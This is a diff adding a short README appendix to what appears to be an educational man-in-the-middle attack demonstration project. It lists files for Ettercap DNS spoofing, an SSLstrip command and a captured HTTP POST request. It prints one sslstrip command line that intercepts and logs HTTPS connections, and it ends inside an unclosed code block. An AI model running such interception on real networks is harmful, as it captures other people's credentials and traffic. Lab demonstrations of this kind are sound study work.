@@ -1,0 +1,19 @@
+# Appendix A: Application Codes
+
+This repository contains the application codes and configuration files used in the MITM (Man-in-the-Middle) attack demonstration project.
+
+---
+
+## Files Included
+
+- `etter.dns`: DNS spoofing configuration for Ettercap
+- `sslstrip_command.txt`: SSLstrip execution command
+- `http_post_capture.txt`: Captured HTTP POST request example
+
+---
+
+## SSLstrip Execution Command
+
+```bash
+sudo sslstrip -k ca.key -c ca.crt -P -l /var/log/ssl -j /var/log/ssl/junk -S /var/log/ssl/conns https 0.0.0.0 8080
+
